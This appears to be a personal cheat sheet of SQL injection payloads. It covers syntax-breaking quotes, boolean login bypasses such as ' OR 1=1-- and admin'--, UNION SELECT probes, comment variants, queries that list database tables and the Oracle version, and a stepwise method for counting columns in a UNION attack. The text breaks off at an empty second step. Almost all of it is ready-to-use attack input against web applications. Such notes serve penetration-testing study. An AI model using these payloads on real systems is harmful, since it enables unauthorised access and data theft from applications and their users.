```
-- Basic syntax breaking
'
"
')
")

-- Boolean-based tests
' OR '1'='1
' OR 1=1--
admin'--

-- UNION-based tests
' UNION SELECT null--
' UNION SELECT 1,2,3--

-- Comment variations
' OR 1=1#
' OR 1=1/*
' OR 1=1--

-- database version
for orecle db SELECT * FROM v$version

-- To list the tables in the DB
SELECT * FROM information_schema.tables

```

Encode it url before using.

### UNION attacks
STEP 1 :  Determin the number of columns required
To determine the number of columns returns from the request
METHOD 1
```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- etc. until it returns error of out of range
```
METHOD 2

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL-- ETC

```

STEP 2: ''